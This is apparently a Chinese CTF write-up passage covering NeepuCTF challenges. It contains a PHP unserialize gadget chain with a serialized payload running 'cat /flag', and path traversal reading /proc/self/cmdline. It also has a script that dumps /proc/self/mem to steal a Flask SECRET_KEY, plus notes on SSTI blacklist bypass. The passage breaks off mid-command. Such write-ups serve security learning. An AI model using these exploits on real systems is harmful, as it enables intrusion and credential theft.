class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">three</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;neepu-&gt;<span class="hljs-title function_ invoke__">neepuctf</span>()||!<span class="hljs-variable language_">$this</span>-&gt;neepu1-&gt;<span class="hljs-title function_ invoke__">neepuctf</span>())&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;fin-&gt;<span class="hljs-title function_ invoke__">NEEPUCTF</span>(<span class="hljs-variable">$this</span>-&gt;rce,<span class="hljs-variable">$this</span>-&gt;rce1);<br>        &#125;<br><br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">four</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;neepu-&gt;<span class="hljs-title function_ invoke__">neepuctf</span>())&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;fin-&gt;<span class="hljs-title function_ invoke__">NEEPUCTF1</span>(<span class="hljs-variable">$this</span>-&gt;rce,<span class="hljs-variable">$this</span>-&gt;rce1);<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key=<span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">five</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$finish</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$name</span>=<span class="hljs-variable language_">$this</span>-&gt;finish[<span class="hljs-variable">$name</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;neepu&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>仔细分析一下，其实three、five是没有使用到的。</p><blockquote><p>在php中，如果一个类没有声明成员变量，我们是可以给一个不存在的成员变量赋值的</p></blockquote><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305221120486.png" alt="image-20230522112056442"></p><p>这一题就是这个情况，我们直接构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$f</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">four</span>();<br><span class="hljs-variable">$f</span>-&gt;rce = <span class="hljs-string">&quot;cat /flag&quot;</span>;<br><span class="hljs-variable">$f</span>-&gt;rce1 = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">one</span>();<br><span class="hljs-variable">$a</span>-&gt;finish-&gt;finish = <span class="hljs-literal">true</span>;<br><span class="hljs-variable">$f</span>-&gt;neepu = <span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">one</span>();<br><span class="hljs-variable">$b</span>-&gt;key=<span class="hljs-literal">true</span>;<br><span class="hljs-variable">$b</span>-&gt;finish-&gt;finish=<span class="hljs-literal">true</span>;<br><span class="hljs-variable">$b</span>-&gt;now[<span class="hljs-string">&#x27;NEEPUCTF1&#x27;</span>] = <span class="hljs-string">&quot;system&quot;</span>;<br><span class="hljs-variable">$f</span>-&gt;fin = <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$f</span>);<br><br><br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;four&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;rce&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;cat /flag&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;rce1&quot;</span>;s:<span class="hljs-number">0</span>:<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;neepu&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;one&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;finish&quot;</span>;O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;stdClass&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;finish&quot;</span>;b:<span class="hljs-number">1</span>;&#125;&#125;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;fin&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;one&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;key&quot;</span>;b:<span class="hljs-number">1</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;finish&quot;</span>;O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;stdClass&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;finish&quot;</span>;b:<span class="hljs-number">1</span>;&#125;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;now&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;NEEPUCTF1&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><h4 id="Cute-Cirno-Cute-Cirno-Revenge"><a href="#Cute-Cirno-Cute-Cirno-Revenge" class="headerlink" title="Cute Cirno &amp; Cute Cirno (Revenge)"></a>Cute Cirno &amp; Cute Cirno (Revenge)</h4><h5 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h5><p>首先查看源码：</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305250159353.png" alt="image-20230525015929206" style="zoom:33%;" /><p>发现一个读文件的路由，根据数据包可知，这是python编写的</p><blockquote><p>在Linux系统中，**&#x2F;proc&#x2F;self&#x2F;cmdline<strong>是一个特殊的文件，它</strong>提供了当前进程的命令行参数信息。**</p><p>在Linux中，&#x2F;proc是一个虚拟文件系统，提供了访问系统内核和进程信息的接口。**&#x2F;proc&#x2F;self是一个符号链接，它指向当前正在执行的进程的目录<strong>。因此，</strong>&#x2F;proc&#x2F;self&#x2F;cmdline实际上指向了当前进程的命令行参数信息。**</p></blockquote><p>我们读取 <code>/proc/self/cmdline</code> 获取命令行信息：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>neepusec.fun:<span class="hljs-number">28912</span><span class="hljs-regexp">/r3aDF1le?filename=../</span>..<span class="hljs-regexp">/../</span>proc<span class="hljs-regexp">/self/</span>cmdline<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305250204341.png" alt="image-20230525020423295"></p><p>返回了一个文件路径，有一个<code>CuteCirno.py</code>文件</p><p>当我们访问一个不存在的路径时</p><p><img src="https://s2.loli.net/2023/05/25/HD4cxYlkut65Fd8.png" alt="image-20230525020627713"></p><p>我们发现报错了，于是读取这两个文件：</p><p>CuteCirno.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, session, render_template, render_template_string<br><span class="hljs-keyword">import</span> os, base64<br><span class="hljs-keyword">from</span> NeepuFile <span class="hljs-keyword">import</span> neepu_files<br><br>CuteCirno = Flask(__name__,<br>                  static_url_path=<span class="hljs-string">&#x27;/static&#x27;</span>,<br>                  static_folder=<span class="hljs-string">&#x27;static&#x27;</span><br>                  )<br><br>CuteCirno.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(base64.b64encode(os.urandom(<span class="hljs-number">30</span>)).decode()) + <span class="hljs-string">&quot;*NeepuCTF*&quot;</span><br><br><br><span class="hljs-meta">@CuteCirno.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">welcome</span>():<br>    session[<span class="hljs-string">&#x27;admin&#x27;</span>] = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;welcome.html&#x27;</span>)<br><br><br><span class="hljs-meta">@CuteCirno.route(<span class="hljs-params"><span class="hljs-string">&#x27;/Cirno&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;CleverCirno.html&#x27;</span>)<br><br><br><span class="hljs-meta">@CuteCirno.route(<span class="hljs-params"><span class="hljs-string">&#x27;/r3aDF1le&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">file_read</span>():<br>    filename = <span class="hljs-string">&quot;static/text/&quot;</span> + request.args.get(<span class="hljs-string">&#x27;filename&#x27;</span>, <span class="hljs-string">&#x27;comment.txt&#x27;</span>)<br>    start = request.args.get(<span class="hljs-string">&#x27;start&#x27;</span>, <span class="hljs-string">&quot;0&quot;</span>)<br>    end = request.args.get(<span class="hljs-string">&#x27;end&#x27;</span>, <span class="hljs-string">&quot;0&quot;</span>)<br>    <span class="hljs-keyword">return</span> neepu_files(filename, start, end)<br><br><br><span class="hljs-meta">@CuteCirno.route(<span class="hljs-params"><span class="hljs-string">&#x27;/genius&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate</span>():<br>    <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;admin&#x27;</span>) == <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(session.get(<span class="hljs-string">&#x27;admin&#x27;</span>))<br>        answer = request.args.get(<span class="hljs-string">&#x27;answer&#x27;</span>)<br>        <span class="hljs-keyword">if</span> answer <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            blacklist = [<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;popen&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>,<br>                         <span class="hljs-string">&#x27;posix&#x27;</span>, <span class="hljs-string">&#x27;builtins&#x27;</span>, <span class="hljs-string">&#x27;namespace&#x27;</span>,<span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;read&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>, <span class="hljs-string">&#x27;mro&#x27;</span>, <span class="hljs-string">&#x27;base&#x27;</span>,<br>                         <span class="hljs-string">&#x27;global&#x27;</span>, <span class="hljs-string">&#x27;init&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-string">&#x27;00&#x27;</span>, <span class="hljs-string">&#x27;chr&#x27;</span>, <span class="hljs-string">&#x27;value&#x27;</span>, <span class="hljs-string">&#x27;get&#x27;</span>, <span class="hljs-string">&quot;url&quot;</span>, <span class="hljs-string">&#x27;pop&#x27;</span>, <span class="hljs-string">&#x27;import&#x27;</span>,<br>                         <span class="hljs-string">&#x27;include&#x27;</span>,<span class="hljs-string">&#x27;request&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#123;&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#125;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;config&#x27;</span>,<span class="hljs-string">&#x27;=&#x27;</span>]<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> blacklist:<br>                <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> answer:<br>                    answer = <span class="hljs-string">&quot;⑨&quot;</span> +<span class="hljs-string">&quot;&quot;&quot;&lt;/br&gt;&lt;img src=&quot;static/woshibaka.jpg&quot; width=&quot;300&quot; height=&quot;300&quot; alt=&quot;Cirno&quot;&gt;&quot;&quot;&quot;</span><br>                    <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> answer == <span class="hljs-string">&#x27;&#x27;</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;你能告诉聪明的⑨, 1+1的answer吗&quot;</span><br>            <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&quot;1+1=&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(answer))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;mathclass.html&#x27;</span>)<br><br>    <span class="hljs-keyword">else</span>:<br>        session[<span class="hljs-string">&#x27;admin&#x27;</span>] = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;你真的是我的马斯塔吗？&quot;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    CuteCirno.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">5000</span>, debug=<span class="hljs-literal">True</span>)<br><br></code></pre></td></tr></table></figure><p>观察一下这个文件，发现 <code>SECRET_KEY</code> 是使用随机数生成的</p><p><code>/genius</code>路由会检查session，所以这一题需要我们伪造session，然后绕过过滤进行ssti</p><p>NeepuFile.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">neepu_files</span>(<span class="hljs-params">filename, start=<span class="hljs-number">0</span>, end=<span class="hljs-number">0</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    data = <span class="hljs-string">b&#x27;&#x27;</span><br><br>    <span class="hljs-keyword">try</span>:<br>        start = <span class="hljs-built_in">int</span>(start)<br>        end = <span class="hljs-built_in">int</span>(end)<br><br>    <span class="hljs-keyword">except</span>:<br>        start = <span class="hljs-number">0</span><br>        end = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">if</span> filename != <span class="hljs-string">&quot;&quot;</span> <span class="hljs-keyword">and</span> os.access(filename, os.R_OK):<br>        f = <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&quot;rb&quot;</span>)<br><br>        <span class="hljs-keyword">if</span> start &gt;= <span class="hljs-number">0</span>:<br>            f.seek(start) <span class="hljs-comment"># 将文件指针移动到start位置</span><br>            <span class="hljs-keyword">if</span> end &gt;= start <span class="hljs-keyword">and</span> end != <span class="hljs-number">0</span>:<br>                data = f.read(end - start)<br><br>            <span class="hljs-keyword">else</span>:<br>                data = f.read()<br><br>        <span class="hljs-keyword">else</span>:<br>            data = f.read()<br><br>        f.close()<br><br>    <span class="hljs-keyword">else</span>:<br>        data = (<span class="hljs-string">&quot;File `%s` not exist or can not be read&quot;</span> % filename).encode()<br><br>    <span class="hljs-keyword">return</span> data<br></code></pre></td></tr></table></figure><p>该文件是用来读取文件内容的，并且可以指定读取的起始地址</p><p>然后我们需要思考突破点，我们怎样才能得到key呢，这个是随机产生的，我们不可能猜出来。</p><p>我们需要寻找其他办法，前面我们使用了 <code>/proc/self/cmdline</code> 获取当前进程的命令行信息。</p><p>这里我们需要知道：<code>/proc/self/maps</code>和 <code>/proc/self/mem</code></p><blockquote><p>在Linux系统中，**&#x2F;proc&#x2F;self&#x2F;maps<strong>是一个特殊文件，它</strong>提供了当前进程的内存映射信息。**</p><p>在Linux中，&#x2F;proc是一个虚拟文件系统，提供了访问系统内核和进程信息的接口。&#x2F;proc&#x2F;self是一个符号链接，指向当前正在执行的进程的目录。因此，**&#x2F;proc&#x2F;self&#x2F;maps实际上指向了当前进程的内存映射信息。**</p><p>该文件包含了当前进程的内存映射区域的详细信息，包括<strong>起始地址、结束地址、访问权限、偏移量、设备号、文件路径</strong>等。每一行对应于一个内存映射区域，</p><p><img src="https://s2.loli.net/2023/05/25/QvDOrbZW98y2Lx1.png" alt="image-20230525021902703"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">55bac9dcb000</span>-<span class="hljs-number">55</span>bac9dcd000 r--p <span class="hljs-number">00000000</span> <span class="hljs-number">08</span>:<span class="hljs-number">01</span> <span class="hljs-number">533672</span>                     /usr/bin/cat <br></code></pre></td></tr></table></figure><p>代表什么意思</p><ul><li><code>55bac9dcb000-55bac9dcd000</code>: 这是内存区域的起始地址和结束地址。该区域从0x55bac9dcb000到0x55bac9dcd000。</li><li><code>r--p</code>: 这表示内存区域的访问权限。在这种情况下，该区域只允许读取（read）操作。</li><li><code>00000000</code>: 这是该内存区域在文件中的偏移量。在这种情况下，偏移量为0。</li><li><code>08:01</code>: 这是指与该内存区域相关联的设备号和节点号。设备号为08，节点号为01。</li><li><code>/usr/bin/cat</code>: 这是映射到该内存区域的文件的路径。在这种情况下，该区域是由<code>/usr/bin/cat</code>文件映射而来。</li></ul><p>综上所述，该行表示了一个只读权限的内存区域，它是由<code>/usr/bin/cat</code>文件映射而来。</p></blockquote><p>根据上面的描述， <code>/proc/self/maps</code>记录了当前进程的内存映射的相关信息，根据这些信息我们可以找到对应的内存空间</p><blockquote><p>在Linux系统中，**&#x2F;proc&#x2F;self&#x2F;mem<strong>是一个特殊文件，它提供了</strong>对当前进程内存的直接访问。**</p><p>在Linux中，&#x2F;proc是一个虚拟文件系统，提供了访问系统内核和进程信息的接口。&#x2F;proc&#x2F;self是一个符号链接，指向当前正在执行的进程的目录。因此，&#x2F;proc&#x2F;self&#x2F;mem实际上指向了当前进程的内存。</p><p>通过读取和写入&#x2F;proc&#x2F;self&#x2F;mem文件，可以直接对当前进程的内存进行操作。这包括读取和修改进程的内存内容，可以用于调试、分析或修改进程的运行时状态。</p><p>但是需要注意的是，&#x2F;proc&#x2F;self&#x2F;mem文件的访问权限通常非常受限制。只有具有足够权限的用户或特权进程才能访问该文件。此外，对于一个普通的应用程序来说，直接读取或写入&#x2F;proc&#x2F;self&#x2F;mem文件通常是不必要且危险的操作。</p></blockquote><p>我们也知道了 <code>/proc/self/mem</code> 文件 ，可以对当前进程内存进行访问。</p><p>总结一下，就是根据 <code>/proc/self/maps</code>提供的内存地址映射信息找到 <code>/proc/self/mem</code>相应的内存块</p><p>由于我们不知道key，但是由于程序在运行时，会将部分信息存入内存中，所以我们只需要找到内存中带有： <code>*NeepuCTF*</code> 字样的字符串取出来就是<code>SECRET_KEY</code>了</p><p>我们编写脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf-8 -*-</span><br><span class="hljs-comment"># @Time : 2023/5/24 23:32</span><br><span class="hljs-comment"># @Author : Leekos</span><br><span class="hljs-comment"># @File : cute.py</span><br><span class="hljs-comment"># @Software : PyCharm</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>url = <span class="hljs-string">&quot;http://neepusec.fun:28912/r3aDF1le?filename=../../../&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">maps</span>():<br><br>    req = requests.get(url=url + <span class="hljs-string">&quot;/proc/self/maps&quot;</span>)<br>    text = req.text<br>    ls = text.split(<span class="hljs-string">&quot;\n&quot;</span>)<br>    pattern = <span class="hljs-string">&quot;([0-9a-z]+)-([0-9a-z]+) rw&quot;</span><br>    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> ls:<br>        map_addr = re.<span class="hljs-keyword">match</span>(pattern,l) <br>        <span class="hljs-keyword">if</span> map_addr:<br>            <span class="hljs-comment"># print(map_addr.group(1),&quot;-&quot;,map_addr.group(2))</span><br>            start = <span class="hljs-built_in">int</span>(map_addr.group(<span class="hljs-number">1</span>), <span class="hljs-number">16</span>) <span class="hljs-comment">#group(1)会得到匹配到的字符串的第1个值，模式串中第1个大括号匹配到的</span><br>            end = <span class="hljs-built_in">int</span>(map_addr.group(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>)<br>            mem_url = url + <span class="hljs-string">&quot;/proc/self/mem&amp;start=&quot;</span>+<span class="hljs-built_in">str</span>(start)+<span class="hljs-string">&quot;&amp;end=&quot;</span>+<span class="hljs-built_in">str</span>(end)<br>            requ = requests.get(url=mem_url)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;*NeepuCTF*&quot;</span> <span class="hljs-keyword">in</span> requ.text:<br>                mem_pattern = <span class="hljs-string">b&quot;[A-Za-z0-9+/=]&#123;40&#125;\*NeepuCTF\*&quot;</span><br>                key = re.findall(mem_pattern, requ.content) <span class="hljs-comment"># 内存有很多不可打印字符，所以使用字节形式</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Secret Key: &quot;</span> + <span class="hljs-built_in">bytes</span>.decode(key[<span class="hljs-number">0</span>])) <span class="hljs-comment"># 将字节解码为字符串</span><br>                <span class="hljs-keyword">break</span><br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    maps()<br></code></pre></td></tr></table></figure><blockquote><p>解释一下这个脚本的意思：</p><p>首先获得maps文件的值，然后分隔成列表，进行遍历。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">pattern = <span class="hljs-string">&quot;([0-9a-z]+)-([0-9a-z]+) rw&quot;</span><br><span class="hljs-comment"># 匹配maps中有读写权限rw的字符串</span><br></code></pre></td></tr></table></figure><p>当匹配到时，if条件为真，将group(1)、group(2)分别转为10进制（代表内存的首末地址）</p><p>然后根据地址读取mem文件的值，如果内存中包含指定字符串就打印出key</p></blockquote><p>然后我们就可以进行session伪造了，但是由于等会需要进行ssti(但是过滤了很多)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">blacklist = [<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;popen&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>,<br><span class="hljs-string">&#x27;posix&#x27;</span>, <span class="hljs-string">&#x27;builtins&#x27;</span>, <span class="hljs-string">&#x27;namespace&#x27;</span>,<span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;read&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>, <span class="hljs-string">&#x27;mro&#x27;</span>, <span class="hljs-string">&#x27;base&#x27;</span>,<br><span class="hljs-string">&#x27;global&#x27;</span>, <span class="hljs-string">&#x27;init&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-string">&#x27;00&#x27;</span>, <span class="hljs-string">&#x27;chr&#x27;</span>, <span class="hljs-string">&#x27;value&#x27;</span>, <span class="hljs-string">&#x27;get&#x27;</span>, <span class="hljs-string">&quot;url&quot;</span>, <span class="hljs-string">&#x27;pop&#x27;</span>, <span class="hljs-string">&#x27;import&#x27;</span>,<br><span class="hljs-string">&#x27;include&#x27;</span>,<span class="hljs-string">&#x27;request&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#123;&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#125;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;config&#x27;</span>,<span class="hljs-string">&#x27;=&#x27;</span>]<br></code></pre></td></tr></table></figure><p>这里有两种写法：</p><p>法一：（字符串拼接）不推荐，很难拼</p><p>法二：</p><p>这里session是可控的，所以我们可以把需要的字符串先存入session中，然后在ssti时从session中取值</p><blockquote><p><code>&#123;%print(session)%&#125;</code>这样可以把session的值打印出来</p><p>我在这里学到了新的东西，jinja2的字符串可以进行字符串切片</p><p>首先我们需要把<code>session</code>转为字符串，我们使用<code>string过滤器</code></p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">(<span class="hljs-name">session</span>|string)[<span class="hljs-name">39:50</span>]<br></code></pre></td></tr></table></figure><p>这样就可以打印出session中的一段值了</p></blockquote><p>首先使用脚本构造flask session：(这里我们把ssti需要使用的字符串也构造到session中了)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">python flask_session_cookie_manager3.py encode -s <span 